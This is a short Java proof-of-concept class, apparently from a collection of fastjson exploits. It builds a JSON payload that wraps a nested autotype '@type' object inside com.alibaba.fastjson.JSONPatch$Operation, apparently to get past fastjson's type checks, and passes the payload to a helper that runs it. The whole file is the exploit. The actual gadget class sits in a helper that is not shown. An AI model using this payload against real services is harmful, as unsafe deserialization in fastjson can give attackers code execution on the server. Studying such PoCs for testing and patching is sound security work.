public class jsonpatch {
    private static String poc = "{\n" +
            "  \"@type\":\"com.alibaba.fastjson.JSONPatch$Operation\",\n" +
            "  \"op\":\"add\",\n" +
            "  \"path\":\"/x\",\n" +
            "  \"value\":{\n" +
            "    \"@type\":\"" + common.type() + "\",\n" +
            "    \"x\":1\n" +
            "  }\n" +
            "}";

    public static void main(String[] args) throws Exception {
        common.run(poc, jsonpatch.class);
    }
}
